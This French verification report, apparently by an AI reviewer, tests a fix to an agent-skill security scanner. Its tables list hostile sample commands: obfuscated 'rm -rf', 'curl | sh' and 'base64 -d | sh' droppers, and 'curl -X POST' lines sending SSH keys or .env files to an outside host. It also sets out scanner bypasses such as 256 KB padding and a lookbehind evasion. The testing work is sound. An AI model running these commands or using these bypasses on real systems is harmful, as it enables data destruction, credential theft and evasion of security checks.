# VERIF-SKILL-FIREWALL-OPUS — contre-vérification adversariale (contexte frais)

- Date : 2026-09-06
- Vérificateur : Claude Opus (contexte frais, adversarial, aucune participation au correctif)
- Objet : correctif de sécurité « déobfuscation du pare-feu de skills » (trou B-4 de
  `docs/audits/2026-09-06-audit-release-opus.md`)
- Worktree : `~/DEV/cb-firewall-2026-09-06`, branche `fix/skill-firewall-deob-2026-09-06`
- Commits vérifiés : `635b63b15`, `3c50434d3`, `de4292193`, `7726588eb` sur base `f7c4eedde`
- Rapport de l'auteur : `docs/reports/2026-09/REPARATION-SKILL-FIREWALL-DEOB.md`
- Base de comparaison : worktree jetable `~/DEV/cb-firewall-base-verif` détaché sur `f7c4eedde`
- Artefacts de mesure : `~/DEV/cb-firewall-2026-09-06/_qa/verif/` (non suivi, non commité)
- Écriture : ce rapport + une ligne de documentation dans `CLAUDE.md` (commit séparé `6c59d2bbe`)

## Surface du correctif

`git diff f7c4eedde..HEAD -- src tests scripts` = 3 changements de comportement :

1. `src/security/text-deobfuscation.ts` : nouvelle fonction `deobfuscateSafeForScan` — couche
   « sûre » (strip `\p{Cf}`, homoglyphes, NFKC+NFKD+strip `\p{Mn}`, zero-width, césures,
   commentaires/balises HTML) sans décodage Base64 ni percent-decode.
2. `src/security/skill-scanner.ts` : `collectPromptInjectionFindings` devient
   `collectDeobfuscatedFindings` — la passe document complet s'applique désormais à TOUTES les
   capacités (couche sûre) et non plus à la seule `prompt-injection` (qui garde la couche
   agressive). Drapeau `CODEBUDDY_SKILL_FIREWALL_DEOB_ALL` (défaut `true`).
3. `src/security/skill-scanner.ts` : motif `dynamic-import` affiné par lookbehind négatif
   `(?<!\bfrom\s+[\w.]+\s+)`.

La passe ligne par ligne d'origine est **inchangée** ; la passe document complet est **additive**
(garde `seen`). La seule modification pouvant RETIRER une détection est le lookbehind (point 3),
qui agit aussi sur la passe ligne.

## Point 1 — Efficacité : 34 cas adverses écrits par le vérificateur

Corpus `~/DEV/cb-firewall-2026-09-06/_qa/verif/adverse{,2}` (29 + 5 SKILL.md), scanné par
`scanSkillFirewall` réel via `_qa/verif/run-scan.ts`, sur HEAD **et** sur `f7c4eedde`.

### 1a. Obfuscations d'un motif réellement dangereux (attendu : quarantine)

| Cas | Charge | AVANT | APRÈS | Motif levé |
| --- | --- | --- | --- | --- |
| A01 | `r<U+200B>m -rf ~/ --no-preserve-root` | allow | **quarantine** | `rm-rf` |
| A02 | `c<U+200B>url … \| sh` | allow | **quarantine** | `remote-download-pipe-shell` |
| A03 | `e<U+200B>val(donneeUtilisateur)` | allow | **quarantine** | `eval` |
| A04 | `require('child_<U+200B>process')` | allow | **quarantine** | `child_process` |
| A05 | homoglyphe cyrillique `сurl … \| bash` | allow | **quarantine** | `remote-download-pipe-shell` |
| A06 | homoglyphe cyrillique `еval("…")` | allow | **quarantine** | `eval` |
| A07 | césure tiret+retour ligne `ch-\nild_process` | allow | **quarantine** | `child_process` |
| A08 | soft hyphen U+00AD `r<U+00AD>m -rf` | allow | **quarantine** | `rm-rf` |
| A09 | espace insécable `rm<U+00A0>-rf` | quarantine | quarantine | `rm-rf` (déjà couvert par `\s`) |
| A10 | fullwidth `ｒｍ －ｒｆ` | allow | **quarantine** | `rm-rf` |
| A11 | combo zero-width + homoglyphe + word-joiner | allow | **quarantine** | `remote-download-pipe-shell` |
| A12 | contrôle bidi RLO U+202E dans `eval(` | allow | **quarantine** | `eval` |
| A13 | `execS<U+200B>ync('id')` | allow | **quarantine** | `execSync` |
| A14 | homoglyphe cyrillique dans `__prоto__` | allow | **quarantine** | `proto` |

**13 basculements allow → quarantine sur 14 cas** (le 14ᵉ était déjà couvert). Le trou B-4 mesuré
par l'audit (`r<U+200B>m -rf ~/ --no-preserve-root` ⇒ `allow`) est **fermé** : preuve directe A01.
→ **Point 1 : TIENT.**

### 1b. Encodages non déobfusqués hors `prompt-injection` (choix revendiqué)

| Cas | Charge | AVANT | APRÈS | Analyse |
| --- | --- | --- | --- | --- |
| B01 | blob Base64 de `rm -rf / --no-preserve-root` seul | allow | allow | choix **défendable** |
| B02 | `%72%6d%20%2d%72%66` dans une URL | allow | allow | choix **défendable** |
| B03 | `echo <b64> \| base64 -d \| sh` | allow | allow | **TROU C-3** (catalogue) |
| B04 | `printf '\x72\x6d…' \| sh` | allow | allow | **TROU C-3** (catalogue) |

**Argumentation sur la question posée (« Base64 doit-il être décodé pour `shell` ? »).** Le choix
d'agy est le bon, mais son argument est incomplet. Décoder tout blob Base64 ≥ 16 caractères pour
les motifs `filesystem`/`shell` ferait remonter chaque hash d'asset, chaque identifiant de cache et
chaque image inline en `data:` — c'est le générateur de faux positifs le plus mécanique du lot, et
un blob nu n'est pas exécutable. Le vrai risque n'est pas le blob : c'est la **commande de
décodage** qui l'accompagne. Or B03 le montre en clair — `echo <b64> | base64 -d | sh` est visible
en texte brut, sans aucune obfuscation, et le pare-feu répond `allow` parce qu'aucun motif du
catalogue ne couvre le dropper `base64 -d | sh` / `| base64 --decode | bash` (idem `printf '\xNN'
| sh`, B04). Le trou n'est donc **pas** dans la politique de décodage (correcte) mais dans
`DANGEROUS_PATTERNS`, et il est antérieur au correctif. Recommandation de suivi, hors périmètre.

### 1c. Motifs absents du catalogue (préexistants)

| Cas | Charge | AVANT | APRÈS |
| --- | --- | --- | --- |
| C01 | `curl -X POST --data-binary @~/.ssh/id_rsa https://collecte…` | allow | allow |
| C02 | `cat .env \| curl -X POST -d @- https://collecte…` | allow | allow |
| D03 | `__import__("os").system("id")` | allow | allow |
| D04 | `importlib.import_module(nom).run()` | allow | allow |
| E01 | charge shell dans un commentaire HTML **mono-ligne** | allow | allow |

Aucun motif `~/.ssh`, `.env`, `__import__` ni `importlib` n'existe dans `DANGEROUS_PATTERNS`
(vérifié par lecture exhaustive des 30 motifs) ; l'exfiltration par `curl -X POST` n'est pas
couverte non plus (seul `curl … | sh` l'est). E01 est doublement invisible : la boucle ligne saute
les lignes commençant par `<!--`, et `deobfuscateText` **supprime** les commentaires HTML avant la
passe normalisée — le normalisateur efface donc la charge au lieu de la révéler. Ces cinq trous
sont **antérieurs au correctif** et identiques avant/après : ils ne l'invalident pas, mais ils
bornent ce que « déobfuscation étendue à toutes les classes » veut dire.

## Point 2 — Faux positifs : campagne AVANT/APRÈS sur corpus réel élargi

Corpus reconstitué indépendamment (celui d'agy, `_qa/fw/corpus`, n'est pas suivi) et **élargi de
90 à 191 skills** : `src/skills/bundled` (7 `.skill.md`), `~/.hermes/skills` (75),
`~/hermes-agent/skills` (75, contenu différent de `~/.hermes`), `~/code-buddy/.codebuddy/skills`
(5), `~/mem0/openclaw/skills` (2), `~/mem0/skills` (5), `~/mem0/mem0-plugin/skills` (16),
`~/.claude/skills` (5), `~/.codex/skills` (6). Le dépôt OpenClaw complet (57 skills) n'existe pas
sur ce disque — recherche `find ~ -maxdepth 6 -type d -name skills` : seuls 2 skills OpenClaw
présents. **191 skills ≥ 30 : la campagne n'est pas faible.**

Script d'agy `scripts/skill-firewall-campaign.ts` exécuté à l'identique sur HEAD et sur
`f7c4eedde` (le script y a été copié) :

| | AVANT (`f7c4eedde`) | APRÈS (HEAD) |
| --- | --- | --- |
| Total | 191 | 191 |
| allow | 128 | 128 |
| review | 24 | 24 |
| quarantine | 39 | 39 |

Comparaison **verdict par verdict, skill par skill** (`_qa/verif/avant.json` vs `apres.json`) :
- **flips de verdict : 0** ;
- 1 seul skill voit sa liste de motifs changer : `mem0plugin/onboard` gagne `template-injection`
  (medium) — il était déjà en `review` avant, le verdict ne bouge pas.

La revendication « 0 bascule AVANT/APRÈS » d'agy est donc **reproduite et renforcée** sur un
corpus deux fois plus grand que le sien. → **Point 2 (faux positifs sur corpus réel) : TIENT.**

### 2b. Le mécanisme de faux positif existe malgré tout (probes synthétiques)

`deobfuscateText` termine par `.replace(/\s+/g,' ')` : la passe normalisée voit le document
**aplati sur une seule ligne**, et les motifs y sont recompilés avec le drapeau `s`. Les classes
`[^|\n]*` et `.*` traversent donc désormais des paragraphes entiers. Trois probes le prouvent :

| Cas | Document légitime | AVANT | APRÈS |
| --- | --- | --- | --- |
| F01 | un paragraphe cite `` `curl` ``, un autre plus bas cite l'anti-patron `` `cat script \| bash` `` | allow | **quarantine** (critical `remote-download-pipe-shell`) |
| F02 | phrase se terminant par « exec » et parenthèse ouvrante en début de ligne suivante | allow | **quarantine** (high `exec` + capacité `shell`) |
| F03 | prose française accentuée (« évaluation », « exécution ») | allow | allow |
| F04 | `$(` en fin de ligne et `)` deux lignes plus bas | allow | **review** (medium `shell-subst`) |

F01 est le plus réaliste : toute documentation qui mentionne `curl` puis, plus loin, déconseille
`… | bash` bascule en **quarantine critical**. Sur les 128 skills `allow` du corpus réel, aucun ne
déclenche ce cas — le risque est donc **mesuré comme non réalisé**, mais il n'est pas nul et la
formule « 0 faux positif » du rapport d'agy doit se lire « 0 faux positif *sur ce corpus* ».
→ **TROU C-2** (documentaire, non bloquant).

### 2c. Le lookbehind `dynamic-import` a-t-il ouvert un contournement ?

| Cas | Charge | AVANT | APRÈS |
| --- | --- | --- | --- |
| D01 | `const m = await from lib import(nomModule);` | quarantine | **allow** |
| G05 | `from utils import(chargeUtile);` | quarantine | **allow** |
| D02 | Python `from mypkg.nodes import (\n Node,\n)` (le FP visé) | allow | allow |
| G01 | `const m = await import(nomModule);` | quarantine | quarantine |
| G02 | `import fs from 'fs';` puis `await import(nomModule)` | quarantine | quarantine |
| D03 | `__import__("os")` | allow | allow (motif absent, cf. C-3) |
| D04 | `importlib.import_module(nom)` | allow | allow (motif absent, cf. C-3) |

**Oui, un contournement existe** (D01/G05) : préfixer `import(` de `from <identifiant> ` sur la
même ligne éteint la détection. Portée réelle : cette séquence est de la syntaxe Python d'import
**statique** (donc pas un chargement dynamique) et n'est pas du JavaScript valide, donc elle ne
constitue pas un vecteur d'exécution. Les vrais imports dynamiques JS restent détectés (G01, G02),
y compris après un import statique. Les contournements `__import__` / `importlib.import_module`
sur plusieurs lignes ne sont **pas ouverts par ce correctif** : ces deux formes n'ont jamais été
couvertes (le `\b` de `\bimport` échoue sur `__import__`, et `import_module(` n'est pas `import(`).
→ **TROU C-1** (affaiblissement réel mais non exploitable en pratique).

### 2d. Borne de 256 Ko contournable

`deobfuscateSafeForScan` tronque à `MAX_SCAN_CHARS = 256 * 1024` **avant** normalisation.

| Cas | Charge | AVANT | APRÈS |
| --- | --- | --- | --- |
| G04 | 1 Ko de bourrage puis `r<U+200B>m -rf /` | allow | **quarantine** |
| G03 | 300 Ko de bourrage puis `r<U+200B>m -rf /` | allow | **allow** |

Un SKILL.md de plus de 256 Ko rouvre donc intégralement le trou B-4 pour tout ce qui suit la
borne — un bourrage trivial suffit. La borne est un garde anti-DoS légitime et **préexistant**
(elle bridait déjà `deobfuscateForScan` pour `prompt-injection`), mais ni le rapport d'agy, ni la
note de version, ni le CHANGELOG ne la mentionnent alors qu'ils annoncent une couverture « à
toutes les classes ». → **TROU B-1** : à documenter (fait ici, cf. point 3) et à traiter en suivi
par un balayage fenêtré plutôt qu'une troncature.

## Point 3 — Drapeau `CODEBUDDY_SKILL_FIREWALL_DEOB_ALL`

**Restauration de l'ancien comportement.** Corpus adverse rejoué avec
`CODEBUDDY_SKILL_FIREWALL_DEOB_ALL=false` puis comparé ligne à ligne à la sortie de `f7c4eedde`
(`diff _qa/verif/base.txt _qa/verif/flag-false.txt`) : **28 cas sur 29 identiques**, une seule
divergence :

```
< D01-lookbehind-bypass | quarantine | 76 | dynamic-import   (base f7c4eedde)
> D01-lookbehind-bypass | allow      | 100 | -               (HEAD, drapeau à false)
```

Le drapeau ne gouverne que la passe de déobfuscation ; l'affinement du motif `dynamic-import` est
inconditionnel. Le kill-switch n'est donc **pas** un retour byte-identique, et dans ce cas précis
il laisse le pare-feu **plus permissif** que la base. Impact pratique nul (cf. C-1), mais la
doctrine « drapeau à `false` ⇒ comportement d'origine » est fausse telle qu'écrite.
→ **TROU B-2.**

**Documentation du défaut `true`.** Absent de `CLAUDE.md` (tableau des variables), absent du
`CHANGELOG.md`, absent de `docs/RELEASE-NOTES-2.0.0.md` — vérifié par `grep`. Un drapeau de
sécurité activé par défaut et non documenté n'est pas administrable.
**Correction appliquée par le vérificateur** (1 ligne, commit séparé `6c59d2bbe`) : ligne
`CODEBUDDY_SKILL_FIREWALL_DEOB_ALL` insérée dans le tableau des variables d'environnement de
`CLAUDE.md`, mentionnant le défaut `true`, la séparation couche sûre / décodage agressif, la borne
de 256 Ko, le surcoût mesuré et le fait que le lookbehind n'est pas couvert par le drapeau.

## Point 4 — Régressions et performance

| Vérification | Commande | Résultat |
| --- | --- | --- |
| Suites ciblées | `npx vitest run tests/security tests/skills tests/agent/self-improvement` | **121 fichiers passés, 1 ignoré ; 1698 tests passés, 3 ignorés, 0 échec** |
| Types | `npx tsc --noEmit -p tsconfig.json` | code 0, 0 erreur |
| Lint | `npm run lint` | **0 erreur**, 2484 avertissements préexistants |
| Blancs | `git diff --check f7c4eedde..HEAD` | code 0 |
| Données personnelles | `npx vitest run tests/security/donnees-personnelles.test.ts` | **40/40** (rejoué après l'ajout dans `CLAUDE.md`) |

HOME isolé `~/DEV/cb-firewall-2026-09-06/_qa/verif/home`, `env -u FORCE_COLOR`.
Les 2 erreurs de lint initialement remontées provenaient d'un fichier de QA du **vérificateur**
(`_qa/verif/make-corpus.mjs`, non suivi), corrigé ; `npx eslint` sur les 4 fichiers du correctif :
0 erreur. Le fichier `tests/skills` ignoré est la suite `better-sqlite3`/bac à sable natif
habituelle, sans lien avec le correctif.

Les 3 ignorés et le fichier ignoré sont ceux du dépôt, identiques sur `f7c4eedde`.

### Performance

`runCampaign` sur les 191 skills (17 Mo), 3 passes après échauffement, même machine, même Node :

| | médiane | par skill |
| --- | --- | --- |
| AVANT (`f7c4eedde`) | **665 ms** | 3,5 ms |
| APRÈS (HEAD) | **1 166 ms** | 6,1 ms |

**×1,75 (+75 %, +2,6 ms par skill).** Le texte normalisé est mémoïsé une seule fois par fichier
(`normalizedSafe` paresseux) ; le surcoût vient des ~28 motifs supplémentaires réexécutés en mode
dotall sur le document aplati, plus NFKC+NFKD. Pas d'explosion, pas de comportement quadratique
observé ; un import Hermes complet (75 skills) coûte environ 0,2 s de plus. Acceptable.

## Tableau de synthèse

| Point | Verdict | Preuve |
| --- | --- | --- |
| 1. Efficacité (obfuscations fermées) | **TIENT** | 13 basculements allow→quarantine sur 14 cas adverses (A01–A14), A01 = le cas exact de l'audit B-4 |
| 1b. Base64/URL non décodés hors injection | **TIENT** (choix défendable) | B01/B02 ; le vrai manque est le motif `base64 -d \| sh` (B03), préexistant → C-3 |
| 2. Faux positifs sur corpus réel | **TIENT** | 191 skills (vs 90 pour l'auteur) : 128/24/39 identiques, **0 flip de verdict** |
| 2b. Mécanisme de faux positif résiduel | **TROU C-2** | F01 quarantine, F02 quarantine, F04 review sur des documents légitimes (aplatissement en une ligne) |
| 2c. Contournement `dynamic-import` | **TROU C-1** | D01/G05 quarantine→allow ; vrais imports dynamiques JS toujours détectés (G01/G02) |
| 2c bis. `__import__` / `importlib` multilignes | **TIENT** (rien d'ouvert) | D03/D04 allow avant comme après — motifs jamais présents au catalogue |
| 2d. Borne 256 Ko | **TROU B-1** | G03 : 300 Ko de bourrage ⇒ `r<U+200B>m -rf /` en `allow` ; non documentée |
| 3. Drapeau `=false` restaure l'ancien | **TROU B-2** | 28/29 identiques ; D01 diverge (lookbehind hors drapeau) |
| 3b. Défaut `true` documenté | **CORRIGÉ ICI** | absent partout ; ligne ajoutée dans `CLAUDE.md` (`6c59d2bbe`) |
| 4. Régressions | **TIENT** | 1698 tests verts, tsc 0, lint 0 erreur, `--check` 0, données perso 40/40 |
| 4b. Performance | **TIENT** | 665 ms → 1 166 ms sur 191 skills (×1,75), mémoïsation en place |
| C-3. Catalogue de motifs | **TROU C** (préexistant) | `~/.ssh`, `.env`, `base64 -d \| sh`, `printf '\xNN' \| sh`, `__import__`, `importlib`, commentaire HTML mono-ligne : tous `allow`, avant comme après |

## Bilan (10 lignes)

1. Le trou B-4 de l'audit est réellement fermé : le cas exact mesuré (`r<U+200B>m -rf ~/`) passe
   d'`allow` à `quarantine`, et 12 autres obfuscations de la même famille avec lui.
2. La revendication « 0 bascule de verdict » est reproduite sur un corpus deux fois plus large que
   celui de l'auteur (191 skills) : 128 allow / 24 review / 39 quarantine, strictement inchangés.
3. La séparation couche sûre / décodage agressif est le bon compromis, et l'argument le plus fort
   n'est pas celui du rapport : un blob Base64 nu n'est pas exécutable, la commande de décodage l'est.
4. Le mécanisme de faux positif existe pourtant : la normalisation aplatit le document en une ligne,
   ce qui fait traverser les paragraphes à `[^|\n]*` et `.*` — trois probes le prouvent, zéro sur corpus réel.
5. Le lookbehind `dynamic-import` ouvre un contournement mesuré (`from X import(…)`), mais il porte
   sur une syntaxe non exécutable en JavaScript et n'affaiblit aucun import dynamique réel.
6. La borne de 256 Ko rouvre intégralement le trou pour tout SKILL.md plus gros : bourrage trivial,
   limite non documentée jusqu'ici — c'est le point de suivi le plus important.
7. Le drapeau ne restaure pas exactement l'ancien comportement (le lookbehind lui échappe) et
   n'était documenté nulle part ; la ligne manquante a été ajoutée à `CLAUDE.md`.
8. Les motifs d'exfiltration (`~/.ssh`, `.env`, `curl -X POST`) et les droppers (`base64 -d | sh`)
   restent absents du catalogue, avant comme après : hors périmètre, mais à ouvrir.
9. Aucune régression : 1698 tests verts, types propres, lint sans erreur, données personnelles 40/40,
   et un surcoût de scan de ×1,75 sans comportement pathologique.
10. Le correctif fait ce qu'il annonce, sans régression mesurable ; les deux trous B sont des
    imprécisions de portée et de documentation, pas des défauts de sécurité au comportement par défaut.

## Suivi recommandé (hors périmètre de cette vérification)

1. **B-1** : remplacer la troncature à 256 Ko par un balayage fenêtré (fenêtres glissantes avec
   recouvrement) pour que le bourrage ne masque plus la charge utile.
2. **B-2** : placer le lookbehind `dynamic-import` derrière le même drapeau, ou assumer et
   documenter qu'il est inconditionnel (fait dans `CLAUDE.md`).
3. **C-3** : ajouter au catalogue les droppers (`base64 -d | sh`, `printf '\xNN' | sh`,
   `iwr | iex` déjà présent) et l'exfiltration (`~/.ssh/id_*`, `.env` vers un `curl -X POST`),
   puis rejouer la campagne AVANT/APRÈS sur les 191 skills avant de fusionner.
4. **C-2** : envisager de conserver les frontières de ligne dans la couche sûre (remplacer les
   retours par un séparateur non consommable par `[^|\n]*` et `.*`) pour supprimer le mécanisme de
   faux positif à la racine.

VERDICT: PUSHABLE
